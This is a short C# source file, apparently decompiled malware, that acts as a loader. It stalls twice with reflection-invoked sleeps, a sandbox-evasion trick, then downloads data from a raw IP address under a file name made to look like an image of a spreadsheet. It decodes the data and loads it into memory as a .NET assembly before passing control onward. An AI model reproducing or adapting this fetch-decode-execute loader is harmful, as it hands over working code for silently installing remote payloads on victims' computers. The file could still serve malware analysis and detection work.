using System;
using System.IO;
using System.Net;
using System.Threading;
using ns0;

namespace ns1;

internal class Class1
{
	internal static int smethod_0()
	{
		typeof(Thread).GetMethod("Sleep", new Type[1] { typeof(int) })!.Invoke(null, new object[1] { 10000 });
		typeof(Thread).GetMethod("Sleep", new Type[1] { typeof(int) })!.Invoke(null, new object[1] { 10000 });
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		string fullName = AppDomain.CurrentDomain.Load(new BinaryReader(WebRequest.Create("http://54.65.13.91/epic/PL1041000058xls.jpg").GetResponse().GetResponseStream()).ReadBytes(88859175).smethod_0()).FullName;
		return Class2.smethod_0(fullName);
	}
}
